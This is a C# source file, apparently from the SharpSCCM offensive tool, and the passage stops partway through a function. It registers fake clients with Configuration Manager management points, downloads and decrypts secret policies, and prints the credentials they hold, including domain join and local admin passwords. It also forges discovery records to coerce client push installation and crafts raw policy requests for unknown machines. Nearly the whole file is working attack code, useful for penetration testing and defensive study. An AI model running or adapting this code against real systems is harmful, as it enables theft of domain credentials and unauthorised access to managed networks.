using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Cryptography.Pkcs;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Xml;
using System.Runtime.InteropServices;

// Configuration Manager SDK
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;

namespace SharpSCCM
{
    static class MgmtPointMessaging
    {
        static MessageCertificateX509 CreateCertificate()
        {
            // Generate certificate for signing and encrypting messages
            string[] oidPurposes = new string[] { "2.5.29.37" }; // Any extended key usage
            MessageCertificateX509 certificate = MessageCertificateX509.CreateSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", oidPurposes, DateTime.Now, DateTime.Now.AddMonths(6));
            return certificate;
        }

        public static MessageCertificateX509Volatile CreateUserCertificate(string subjectName = null, bool store = false)
        {
            // Generate certificate for signing and encrypting messages
            if (string.IsNullOrEmpty(subjectName))
            {
                subjectName = "ConfigMgr Client Messaging";
            }
            using (RSA rsaKey = RSA.Create(2048))
            {
                CertificateRequest certRequest = new CertificateRequest($"CN={subjectName}", rsaKey, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                certRequest.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.DataEncipherment, false));
                // Any extended key usage
                certRequest.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.4.1.311.101.2"), new Oid("1.3.6.1.4.1.311.101") }, true));
                X509Certificate2 certificate2 = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
                certificate2.FriendlyName = $"{subjectName}";
                byte[] exportedCertBytes = certificate2.Export(X509ContentType.Pfx, string.Empty);
                X509Certificate2 exportedCert = new X509Certificate2(exportedCertBytes, string.Empty, X509KeyStorageFlags.Exportable);
                Console.WriteLine($"[+] Created \"{subjectName}\" certificate in memory for device registration and signing/encrypting subsequent messages");
                if (store)
                {
                    StoreCertificate(exportedCert, "My", StoreLocation.CurrentUser);
                }
                Console.WriteLine($"[+] Reusable Base64-encoded certificate:\n\n    {Helpers.ByteArrayToString(exportedCertBytes)}\n");
                MessageCertificateX509Volatile certificate = new MessageCertificateX509Volatile(exportedCert);
                return certificate;
            }
        }

        public static string DecryptPolicyBody(byte[] policyDownloadResponseBytes, MessageCertificateX509 encryptionCertificate)
        {
            // Parse response ASN1 and decrypt contents
            ContentInfo contentInfo = new ContentInfo(policyDownloadResponseBytes);
            EnvelopedCms pkcs7EnvelopedCms = new EnvelopedCms(contentInfo);
            pkcs7EnvelopedCms.Decode(policyDownloadResponseBytes);
            RecipientInfo encryptedKey = pkcs7EnvelopedCms.RecipientInfos[0];
            try
            {
                pkcs7EnvelopedCms.Decrypt(encryptedKey, new X509Certificate2Collection(encryptionCertificate.X509Certificate));
                Console.WriteLine($"[+] Successfully decoded and decrypted secret policy");
                string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
                return decryptedPolicyBody;
            }
            catch (Exception)
            {
                Console.WriteLine("[!] Could not decrypt the secret policy");
                return null;
            }
        }

        public static void DeleteCertificate(MessageCertificateX509 certificate)
        {
            var x509Store = new X509Store("My", StoreLocation.CurrentUser);
            x509Store.Open(OpenFlags.MaxAllowed);
            x509Store.Remove(certificate.X509Certificate);
            Console.WriteLine($"[+] Deleted the \"{certificate.X509Certificate.SubjectName.Name}\" certificate from {x509Store.Name} store for {x509Store.Location}");
        }

        public static void GetAvailablePackages(string managementPoint = null, string siteCode = null)
        {

        }

        public static (MessageCertificateX509, MessageCertificateX509, SmsClientId) GetCertsAndClientId(string managementPoint = null, string siteCode = null, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string encodedCertPassword = null)
        {
            MessageCertificateX509 signingCertificate = null;
            MessageCertificateX509 encryptionCertificate = null;
            SmsClientId clientId = null;

            if (!string.IsNullOrEmpty(encodedCertificate) && !string.IsNullOrEmpty(providedClientId))
            {
                encodedCertPassword = (encodedCertPassword != null) ? encodedCertPassword : string.Empty;
                try
                {
                    X509Certificate2 certificateToImport = new X509Certificate2(Helpers.StringToByteArray(encodedCertificate), encodedCertPassword, X509KeyStorageFlags.Exportable);
                    Console.WriteLine($"[+] Using provided certificate and SMS client ID: {providedClientId}");
                    signingCertificate = new MessageCertificateX509Volatile(certificateToImport);
                    encryptionCertificate = signingCertificate;
                    clientId = new SmsClientId(providedClientId);
                }
                catch (Exception ex)
                {
                    string szEncodedCertIdentifier = $"Encoded String:{encodedCertificate.Substring(0, 10)}";
                    if (ex.ToString().Contains("network password is not correct"))
                    {
                        if (encodedCertPassword == String.Empty)
                        {
                            Console.WriteLine($"[-] Provided encoded certificate ({szEncodedCertIdentifier}...) requires a password.");
                        }
                        else
                        {
                            Console.WriteLine($"[-] Provided password for encoded certificate ({szEncodedCertIdentifier}...) is not correct.");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"[-] Error while importing encoded certificate ({szEncodedCertIdentifier}...)");
                    }
                }
            }
            else if (string.IsNullOrEmpty(registerClient))
            {
                if (Helpers.IsHighIntegrity())
                {
                    (signingCertificate, encryptionCertificate) = (LocalSmsSigningCertificate(), LocalSmsEncryptionCertificate());
                    if (signingCertificate != null && encryptionCertificate != null)
                    {
                        clientId = ClientWmi.GetSmsId();
                    }
                    else
                    {
                        Console.WriteLine("[!] The SCCM client may not be installed on this machine");
                        Console.WriteLine("[!] Try registering a new device to obtain a client GUID and reusable certificate");
                        return (signingCertificate, encryptionCertificate, clientId);
                    }
                }
                else
                {
                    Console.WriteLine("[!] A new device record must be created when the user is not a local administrator");
                }
            }
            else
            {
                if (string.IsNullOrEmpty(managementPoint) || string.IsNullOrEmpty(siteCode))
                {
                    (managementPoint, siteCode) = ClientWmi.GetCurrentManagementPointAndSiteCode();
                }
                signingCertificate = CreateUserCertificate(null, false);
                encryptionCertificate = signingCertificate;
                string authenticationType = (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password)) ? "Windows" : null;
                clientId = RegisterClient(signingCertificate, registerClient, managementPoint, siteCode, authenticationType, username, password);
            }
            return (signingCertificate, encryptionCertificate, clientId);
        }

        public static async void GetSecretsFromPolicies(string managementPoint, string siteCode, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string outputPath = null)
        {
            // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
            // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval

            (MessageCertificateX509 signingCertificate, MessageCertificateX509 encryptionCertificate, SmsClientId clientId) = GetCertsAndClientId(managementPoint, siteCode, encodedCertificate, providedClientId, username, password, registerClient);

            if (signingCertificate != null && encryptionCertificate != null && clientId != null)
            {
                // Send request for policy assignments to obtain policy locations
                ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);

                foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
                {
                    GetSecretsFromPolicy(policyAssignment, managementPoint, clientId, encryptionCertificate, outputPath);
                }
            }
        }
        public static async void GetSecretsFromPolicy(PolicyAssignment policyAssignment, string managementPoint, SmsClientId clientId, MessageCertificateX509 encryptionCertificate, string outputPath = null)
        {

            // Get secret policies
            string outputFull = "";
            string outputCredsDecrypted = "";
            string outputCredsEncrypted = "";
            if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
            {
                Console.WriteLine("[+] Found policy containing secrets:");
                Console.WriteLine($"      ID: {policyAssignment.Policy.Id}");
                Console.WriteLine($"      Flags: {policyAssignment.Policy.Flags}");
                Console.WriteLine($"      URL: {policyAssignment.Policy.Location.Value}");

                // Can't figure out how to authenticate with the SDK so using raw HTTP requests
                string decryptedPolicyBody = null;
                HttpResponseMessage policyDownloadResponse = null;
                try
                {
                    string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
                    policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId, encryptionCertificate);
                    byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
                    Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
                }
                catch
                {
                    Console.WriteLine($"      Failed to download :/");
                    return;
                }
                if (policyDownloadResponse != null)
                {
                    byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
                    try
                    {
                        decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
                    }
                    catch
                    {
                        Console.WriteLine($"[-] Error while trying to decrypt policy response :/...");
                    }
                }
                if (decryptedPolicyBody != null)
                {
                    outputFull += decryptedPolicyBody;
                    XmlDocument policyXmlDoc = new XmlDocument();
                    policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
                    Helpers.DecompressXMLNodes(policyXmlDoc);
                    XmlNodeList propertyNodeList = policyXmlDoc.GetElementsByTagName("property");
                    bool bIsUnnamedVariable = false;
                    string szAdditionalVarAttributes = "";
                    foreach (XmlNode propertyNode in propertyNodeList)
                    {
                        if (propertyNode.Attributes["secret"] != null)
                        {
                            string szSecretName = propertyNode.Attributes["name"].Value;
                            string szSecretValue = propertyNode.InnerText.Trim();
                            string szDecData;
                            bool bDecryptSuccess = Helpers.DecryptDESSecret(szSecretValue, out szDecData);

                            if (szSecretName == "TS_Sequence")
                            {
                                XmlDocument tsSequenceDoc = new XmlDocument();
                                tsSequenceDoc.LoadXml(szDecData.Replace("\0", "").Trim());
                                Helpers.DecompressXMLNodes(policyXmlDoc);
                                // search for 'OSDLocalAdminPassword', 'OSDDomainName', 'OSDJoinPassword', 'OSDJoinAccount', 'OSDRegisteredUserName', 'OSDRegisteredOrgName'
                                XmlNodeList osdLocalAdminPWNodes = tsSequenceDoc.SelectNodes("//variable[@name='OSDLocalAdminPassword' or @name='OSDDomainName' or @name='OSDJoinPassword' or @name='OSDJoinAccount' or @name='OSDRegisteredUserName' or @name='OSDRegisteredOrgName']");
                                foreach (XmlNode variableNode in osdLocalAdminPWNodes)
                                {
                                    string szVariableName = variableNode.Attributes["name"].Value;
                                    outputCredsDecrypted += $"TaskSequence variable '{szVariableName}': {variableNode.InnerText}\n";
                                }
                            }
                            if (szSecretName == "Value")
                            {
                                bIsUnnamedVariable = true;
                            }

                            if (bDecryptSuccess)
                            {
                                outputCredsDecrypted += $"{szSecretName}: {szDecData}\n";
                            }
                            else
                            {
                                outputCredsEncrypted += $"{szSecretName}: {szSecretValue}\n";
                            }
                        }
                        else
                        {
                            string szPropertyName = propertyNode.Attributes["name"].Value;
                            string szPropertyType = propertyNode.Attributes["type"].Value;
                            string szPropertyValue = propertyNode.InnerText.Trim();
                            szAdditionalVarAttributes += $"Propery '{szPropertyName}': {szPropertyValue} (Type: {szPropertyType})\n";
                        }
                    }
                    if (bIsUnnamedVariable)
                    {
                        // adding additional information to credentials
                        outputCredsDecrypted += szAdditionalVarAttributes;
                    }
                }
            }


            if (!string.IsNullOrEmpty(outputPath))
            {
                File.WriteAllText(outputPath, outputFull);
                Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
            }

            if (!string.IsNullOrEmpty(outputCredsDecrypted))
            {
                Console.WriteLine($"[+] Decrypted secrets:\n\n{outputCredsDecrypted.TrimEnd()}\n");
            }
            if (!string.IsNullOrEmpty(outputCredsEncrypted))
            {
                Console.WriteLine($"[+] Encrypted secrets:\n\n{outputCredsEncrypted.TrimEnd()}\n");
                // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
                Console.WriteLine("[+] Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
            }
        }

        public static MessageCertificateX509 LocalSmsEncryptionCertificate()
        {
            MessageCertificateX509 certificate = null;
            // Get encryption certificate used by the legitimate client when PKI is not in use
            try
            {
                certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
                Console.WriteLine("[+] Obtained SMS Encryption Certificate from local computer certificates store");
            }
            catch (CryptographicException)
            {
                Console.WriteLine($"[!] Could not locate the SMS Encryption Certificate in the local computer certificates store");
            }
            return certificate;
        }

        public static MessageCertificateX509 LocalSmsSigningCertificate()
        {

            MessageCertificateX509 certificate = null;
            // Get signing certificate used by the legitimate client when PKI is not in use
            try
            {
                certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
                Console.WriteLine("[+] Obtained SMS Signing Certificate from local computer certificates store");
            }
            catch (CryptographicException)
            {
                Console.WriteLine($"[!] Could not locate the SMS Signing Certificate in the local computer certificates store");
            }
            return certificate;
        }

        public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, string authenticationType = null, string username = null, string password = null)
        {
            SmsClientId clientId = null;
            HttpSender sender = new HttpSender();
            ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();
            // Add the certificate that will be tied to the new client ID for message signing and encryption
            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
            Console.WriteLine("[+] Discovering local properties for client registration request");
            registrationRequest.Discover();
            // Modify properties
            Console.WriteLine("[+] Modifying client registration request properties:");
            registrationRequest.AgentIdentity = "CCMSetup.exe";
            if (!string.IsNullOrEmpty(target))
            {
                registrationRequest.ClientFqdn = target;
                registrationRequest.NetBiosName = target;
            }
            Console.WriteLine($"      FQDN: {registrationRequest.ClientFqdn}"); // Original ClientFqdn derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
            Console.WriteLine($"      NetBIOS name: {registrationRequest.NetBiosName}"); // Original NetBiosName derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
            registrationRequest.Settings.HostName = managementPoint;
            registrationRequest.Settings.Compression = MessageCompression.Zlib;
            registrationRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            registrationRequest.SiteCode = siteCode;
            if (authenticationType == "Windows")
            {
                registrationRequest.Settings.Security.AuthenticationType = AuthenticationType.WindowsAuth;
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    Console.WriteLine($"      Authenticating as: {username}");
                    registrationRequest.Settings.Security.Credentials = new NetworkCredential(username, password);
                }
            }
            Console.WriteLine($"      Site code: {registrationRequest.SiteCode}");
            // Serialize message XML
            registrationRequest.SerializeMessageBody();
            //Console.WriteLine($"\n[+] Registration Request Body:\n{System.Xml.Linq.XElement.Parse(registrationRequest.Body.ToString())}");
            // Register client and wait for a confirmation with the SmsId
            Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
            try
            {
                clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
                Console.WriteLine($"[+] Received unique SMS client GUID for new device:\n\n    {clientId}\n");
            }
            catch (WebException ex)
            {
                Console.WriteLine($"[!] An exception occurred while contacting the management point: {ex.Message}");
            }
            return clientId;
        }

        public static void SendDDR(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, SmsClientId clientId)
        {
            HttpSender.AllowProxyTraversal = true;
            HttpSender sender = new HttpSender();
            // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
            ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();
            // Add our certificate for message signing and encryption
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Encryption);
            Console.WriteLine("[+] Discovering local properties for DDR inventory report");
            // Generate inventory report XML
            ddrMessage.Discover();
            Console.WriteLine("[+] Modifying DDR and inventory report properties");
            // Set the client GUID to the one registered for the new fake client
            ddrMessage.SmsId = new SmsClientId(clientId.ToString());
            string originalSourceHost = ddrMessage.Settings.SourceHost;
            // Set target to local machine if not provided in command line option
            if (string.IsNullOrEmpty(target))
            {
                target = originalSourceHost;
            }
            ddrMessage.Settings.SourceHost = target;
            ddrMessage.NetBiosName = target;
            ddrMessage.SiteCode = siteCode;
            // Serialization is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body
            ddrMessage.SerializeMessageBody();
            // Update inventory report header with new device information
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientId = new InventoryClientIdBase(clientId);
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientInstalled = false;
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.NetBiosName = target;
            // Modify DDR XML
            string ddrBodyXml = ddrMessage.Body.ToString();
            XmlDocument ddrXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            ddrXmlDoc.LoadXml("<root>" + ddrBodyXml + "</root>");
            XmlNode clientInstalled = ddrXmlDoc.SelectSingleNode("//ClientInstalled");
            clientInstalled.InnerText = "0";
            XmlNode modifiedDdrXml = ddrXmlDoc.SelectSingleNode("//root");
            ddrBodyXml = modifiedDdrXml.InnerXml;
            // Use reflection to modify read-only Body property
            typeof(MessageBody).GetProperty("Payload").SetValue(ddrMessage.Body, ddrBodyXml);
            // Modify inventory report XML
            string inventoryReportXml = ddrMessage.InventoryReport.ReportBody.RawXml;
            XmlDocument inventoryXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            inventoryXmlDoc.LoadXml("<root>" + inventoryReportXml + "</root>");
            // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
            XmlNode platformIdNode = inventoryXmlDoc.SelectSingleNode("//PlatformID");
            Console.WriteLine($"[+] Discovered PlatformID: {platformIdNode.InnerXml}");
            platformIdNode.InnerText = "Microsoft Windows NT Workstation 2010.0";
            Console.WriteLine($"[+] Modified PlatformID: {platformIdNode.InnerXml}");
            // Replace original FQDN with supplied one
            XmlNode fqdnNode = inventoryXmlDoc.SelectSingleNode("//FQDN");
            fqdnNode.InnerText = target;
            XmlNode modifiedXml = inventoryXmlDoc.SelectSingleNode("//root");
            inventoryReportXml = modifiedXml.InnerXml;
            // Replace original NetBIOS name with supplied name
            inventoryReportXml = inventoryReportXml.Replace(originalSourceHost, target);
            // Use reflection to modify read-only RawXml property
            typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, inventoryReportXml);
            // Display XML to user
            //Console.WriteLine($"\n[+] DDR Body:\n{System.Xml.Linq.XElement.Parse(ddrBodyXml)}");
            //Console.WriteLine($"\n[+] Inventory Report Body:\n{System.Xml.Linq.XElement.Parse("<root>" + ddrMessage.InventoryReport.ReportBody.RawXml + "</root>")}\n");
            // Assemble message and send
            ddrMessage.Settings.Compression = MessageCompression.Zlib;
            ddrMessage.Settings.ReplyCompression = MessageCompression.Zlib;
            ddrMessage.Settings.HostName = managementPoint;
            Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} and requesting client installation on {target}");
            ddrMessage.SendMessage(sender);
        }

        public static ConfigMgrContentLocationReply SendContentLocationRequest(string managementPoint, string siteCode, string packageId, int packageVersion, bool cert = false)
        {
            HttpSender sender = new HttpSender();
            ConfigMgrContentLocationRequest contentLocationRequest = new ConfigMgrContentLocationRequest();
            contentLocationRequest.Discover();
            contentLocationRequest.Settings.HostName = managementPoint;
            contentLocationRequest.SiteCode = siteCode;
            contentLocationRequest.LocationRequest.Package.PackageId = packageId;
            contentLocationRequest.LocationRequest.Package.Version = packageVersion;
            ConfigMgrContentLocationReply contentLocationReply = contentLocationRequest.SendMessage(sender);
            Console.WriteLine(contentLocationReply.Body);
            return contentLocationReply;
        }

        public static ConfigMgrPolicyAssignmentReply SendPolicyAssignmentRequest(SmsClientId clientId, MessageCertificateX509 certificate, string managementPoint, string siteCode)
        {
            HttpSender.AllowProxyTraversal = true;
            HttpSender sender = new HttpSender();
            ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();
            // Sign message with the certificate associated with the SmsId
            assignmentRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            assignmentRequest.SmsId = clientId;
            assignmentRequest.Settings.HostName = managementPoint;
            assignmentRequest.SiteCode = siteCode;
            Console.WriteLine($"[+] Obtaining {assignmentRequest.RequestType} {assignmentRequest.ResourceType} policy assignment from {assignmentRequest.Settings.HostName} {assignmentRequest.SiteCode}");
            ConfigMgrPolicyAssignmentReply assignmentReply = assignmentRequest.SendMessage(sender);
            Console.WriteLine($"[+] Found {assignmentReply.ReplyAssignments.PolicyAssignments.Count} policy assignments");
            return assignmentReply;
        }

        public static string SendHTTPRequest(string url, string httpMethod, string contentType, string data, WebProxy proxy = null)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            if (proxy != null)
                request.Proxy = proxy;
            request.Method = httpMethod;
            request.ContentType = contentType;

            if (data != null)
            {
                byte[] byteData = Encoding.UTF8.GetBytes(data);
                request.ContentLength = byteData.Length;
                using (Stream postStream = request.GetRequestStream())
                {
                    postStream.Write(byteData, 0, byteData.Length);
                }
            }

            using (WebResponse response = request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(responseStream, Encoding.UTF8);
                    return reader.ReadToEnd();
                }
            }
        }

        public static async void SendPolicyAssignmentRequestWithExplicitData(string machineGUID, string szMediaGUID, string szEncodedSigningCert, string szMPHostname, string szSiteCode, string szHTTPProxyAddress = null)
        {
            HttpClientHandler httpClientHandler = new HttpClientHandler() { };
            if (szHTTPProxyAddress != null)
            {
                httpClientHandler.Proxy = new WebProxy(szHTTPProxyAddress);
                httpClientHandler.UseProxy = true;
            }
            HttpClient httpClient = new HttpClient(httpClientHandler);
            //
            // Prepare Arguments
            //
            if (machineGUID == null)
            {
                // Query MP for
                Console.WriteLine($"[*] ClientID not given, querying for MP at 'http://{szMPHostname}/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA' for GUIDs for unknown machines...");
                HttpResponseMessage response = null;
                try
                {
                    response = httpClient.GetAsync($"http://{szMPHostname}/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA").Result;
                }
                catch (Exception ex)
                {
                    if (ex.InnerException.Message == "A task was canceled.")
                    {
                        Console.WriteLine($"[-] Request timed out after '{httpClient.Timeout.TotalSeconds}' seconds...");
                        if (httpClientHandler.UseProxy)
                        {
                            Console.WriteLine($"    A web proxy was used, maybe there is an issue with that.");
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] Error while waiting for response");
                        Console.WriteLine("--- Error Message ---");
                        Console.WriteLine($"{ex}");
                        Console.WriteLine("--- Error Message End ---");
                    }
                }
                if (response != null)
                {
                    string xmlResponse = await response.Content.ReadAsStringAsync();
                    var xmlResponseDoc = new XmlDocument();
                    xmlResponseDoc.LoadXml(xmlResponse);

                    // Use xmlDoc to parse and manipulate the XML data
                    XmlNodeList nodeList = xmlResponseDoc.SelectNodes("//UnknownMachines");
                    foreach (XmlNode node in nodeList)
                    {
                        string szUnknownGUIDX64 = node.Attributes["x64UnknownMachineGUID"].Value;
                        if (szUnknownGUIDX64 != null)
                        {
                            machineGUID = szUnknownGUIDX64;
                            break;
                        }
                        string szUnknownGUIDX86 = node.Attributes["x86UnknownMachineGUID"].Value;
                    }
                }
                if (machineGUID != null)
                {
                    Console.WriteLine($"[*] Using ClientID: {machineGUID}...");
                }
                else
                {
                    Console.WriteLine($"[-] Could not find ClientID. Exiting...");
                    return;
                }

            }
            // some parts require a GUID with curly brackets, some without
            string szMachineGUIDPlain = machineGUID.Trim(new char[] { '{', '}' });
            string szMachineGUIDCurlyBrackets = $"{{{szMachineGUIDPlain}}}";
            string szMediaGUIDPlain = szMediaGUID.Trim(new char[] { '{', '}' });
            string szMediaGUIDCurlyBrackets = $"{{{szMediaGUIDPlain}}}";

            (MessageCertificateX509 signingCertificate, MessageCertificateX509 encryptioncertificate, SmsClientId _) = GetCertsAndClientId(null, null, szEncodedSigningCert, machineGUID, null, null, null, szMediaGUIDCurlyBrackets.Substring(0, 31));
            if (signingCertificate == null)
            {
                return;
            }

            //
            // Build Signature
            //
            string szCurrentTimeAsIso = TimeHelpers.CurrentTimeAsIso8601;
            string szClientToken = $"{szMediaGUIDCurlyBrackets};{szCurrentTimeAsIso}";
            byte[] abyClientTokenUnicodeBytes = Encoding.Unicode.GetBytes(szClientToken);

            byte[] abyClientTokenSignature = signingCertificate.Sign(abyClientTokenUnicodeBytes, "SHA-256", MessageCertificateSigningOptions.CryptNoHashId);
            string szClientTokenSignature = BitConverter.ToString(abyClientTokenSignature).Replace("-", "");

            //
            // Build Request
            //
            httpClient = new HttpClient(httpClientHandler);
            httpClient.DefaultRequestHeaders.Add("User-Agent", "ConfigMgr Messaging HTTP Sender");
            httpClient.DefaultRequestHeaders.ExpectContinue = false;

            var requestNew = new HttpRequestMessage(new HttpMethod("CCM_POST"), $"http://{szMPHostname}/ccm_system/request");

            // Set the content type header
            System.Net.Http.Headers.MediaTypeHeaderValue contentType = new System.Net.Http.Headers.MediaTypeHeaderValue("multipart/mixed");
            var boundaryNew = "------------" + DateTime.Now.Ticks.ToString("x");
            contentType.Parameters.Add(new System.Net.Http.Headers.NameValueHeaderValue("boundary", boundaryNew));
            // Create the multipart content
            MultipartContent multipartContent = new MultipartFormDataContent(boundaryNew);
            multipartContent.Headers.ContentType = contentType;
            //
            // Add first payload 
            // https://github.com/MWR-CyberSec/PXEThief/blob/main/pxethief.py#L712
            // 
            byte[] payload_request1 = Encoding.Unicode.GetBytes(
                $@"<Msg ReplyCompression=""none""><ID/><SourceID>{szMachineGUIDPlain}</SourceID>" +
                @"<ReplyTo>direct:OSD</ReplyTo>" +
                @"<Body Type=""ByteRange"" Offset=""0"" Length=""728""/>" +
                @"<Hooks><Hook2 Name=""clientauth""><Property Name=""Token"">" +
                $@"<![CDATA[ClientToken:{szClientToken}{"\r"}{"\n"}ClientTokenSignature:{szClientTokenSignature}{"\r"}{"\n"}]]>" +
                @"</Property></Hook2></Hooks>" +
                @"<Payload Type=""inline""/>" +
                @"<TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>"
            );
            byte[] dataPayloadField1 = new byte[2 + payload_request1.Length];
            dataPayloadField1[0] = 0xFF;
            dataPayloadField1[1] = 0xFE;
            Array.Copy(payload_request1, 0, dataPayloadField1, 2, payload_request1.Length);
            ByteArrayContent payloadField1 = new ByteArrayContent(dataPayloadField1);

            System.Net.Http.Headers.ContentDispositionHeaderValue headerContentDispositionField1 = new System.Net.Http.Headers.ContentDispositionHeaderValue("form-data");
            headerContentDispositionField1.Name = @"""Msg""";
            System.Net.Http.Headers.MediaTypeHeaderValue headerContentTypeField1 = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
            headerContentTypeField1.CharSet = "UTF-16";

            payloadField1.Headers.ContentDisposition = headerContentDispositionField1;
            payloadField1.Headers.ContentType = headerContentTypeField1;
            multipartContent.Add(payloadField1);

            //
            // Add second payload 
            // https://github.com/MWR-CyberSec/PXEThief/blob/main/pxethief.py#L713
            // 
            byte[] payload_request2 = Encoding.Unicode.GetBytes(
                @"<RequestAssignments SchemaVersion=""1.00"" RequestType=""Always"" Ack=""False"" ValidationRequested=""CRC"">" +
                $@"<PolicySource>SMS:{szSiteCode}</PolicySource><ServerCookie/><Resource ResourceType=""Machine""/>" +
                $@"<Identification><Machine><ClientID>{szMachineGUIDPlain}</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification>" +
                $"</RequestAssignments>\r\n"
            );
            byte[] dataPayloadField2 = new byte[payload_request1.Length + 3];
            Array.Copy(payload_request2, 0, dataPayloadField2, 0, payload_request2.Length);
            Array.Copy(new byte[] { 0x00, 0x00, 0x00 }, 0, dataPayloadField2, payload_request2.Length, 3);

            ByteArrayContent payloadField2 = new ByteArrayContent(dataPayloadField2);
            System.Net.Http.Headers.ContentDispositionHeaderValue headerContentDispositionField2 = new System.Net.Http.Headers.ContentDispositionHeaderValue("form-data");
            headerContentDispositionField2.Name = @"""RequestAssignments""";
            payloadField2.Headers.ContentDisposition = headerContentDispositionField2;

            //
            // Finalize and send request
            //
            multipartContent.Add(payloadField2);
            requestNew.Content = multipartContent;

            httpClient.Timeout = TimeSpan.FromSeconds(5); // set a 5 second timeout
            HttpResponseMessage assignmentResponse = null;
            try
            {
                assignmentResponse = httpClient.SendAsync(requestNew).Result;
            }
            catch (Exception ex)
            {
                if (ex.InnerException.Message == "A task was canceled.")
                {
                    Console.WriteLine($"[-] Request timed out after '{httpClient.Timeout.TotalSeconds}' seconds...");
                    if (httpClientHandler.UseProxy)
                    {
                        Console.WriteLine($"    A web proxy was used, maybe there is an issue with that.");
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error while waiting for response");
                    Console.WriteLine("--- Error Message ---");
                    Console.WriteLine($"{ex}");
                    Console.WriteLine("--- Error Message End ---");
                }
            }

            if (assignmentResponse != null && assignmentResponse.IsSuccessStatusCode)
            {
                if (assignmentResponse.Content.Headers.ContentLength == 0)
                {
                    Console.WriteLine("[-] Empty server response. This usually means the ClientID or signature is invalid (invalid/wrong certificate).");
